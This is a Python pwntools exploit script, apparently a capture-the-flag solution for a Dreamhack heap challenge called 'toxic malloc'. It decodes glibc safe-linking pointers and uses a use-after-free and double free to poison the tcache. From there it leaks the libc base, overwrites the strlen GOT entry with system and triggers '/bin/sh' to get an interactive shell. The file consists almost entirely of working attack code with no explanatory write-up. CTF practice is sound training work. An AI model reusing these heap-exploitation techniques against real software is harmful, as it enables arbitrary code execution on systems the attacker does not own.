from pwn import *

# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

env={"LD_PRELOAD":"./Pwnable/toxic malloc/problem/deploy/libc.so.6"}
rem = process("./Pwnable/toxic malloc/problem/deploy/chall", env=env)
# port = 18595
# rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/toxic malloc/problem/deploy/libc.so.6")

def safe_link(pos, ptr):
  return (pos >> 12) ^ ptr

def decrypt_safe_linking(ptr):
  _12bits = []
  dec = 0
  while ptr != 0:
    _12bits.append(ptr & 0xfff)
    ptr = ptr >> 12

  x = _12bits.pop()
  while len(_12bits) > 0:
    dec |= x
    dec = dec << 12
    y = _12bits.pop()
    x = x ^ y
  dec |= x

  return dec

def create(idx, data):
  rem.sendlineafter(b'choice:', b"1")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendlineafter(b': ', data)

def update(idx, data):
  rem.sendlineafter(b'choice:', b"2")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendlineafter(b': ', data)

def read(idx):
  rem.sendlineafter(b'choice:', b"3")
  rem.sendlineafter(b": ", str(idx).encode())
  rem.recvuntil(b"data: ")
  return rem.recvline()

def delete(idx):
  rem.sendlineafter(b'choice:', b"4")
  rem.sendlineafter(b": ", str(idx).encode())

create(0, b'A' * 7)
create(4, b'A' * 7)
delete(0)
for i in range(7):
  update(0, chr(ord('B') + i).encode() * 16)
  delete(0)

lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
strlen_got = lib_base + lib.got['strlen']
sys_addr = lib_base + lib.symbols['system']
print(hex(strlen_got))

create(1, p64(strlen_got))
create(2, b"A" * 7)
create(3, p64(sys_addr))
update(0, b"/bin/sh\x00")
read(0)

gdb.attach(rem)
rem.interactive()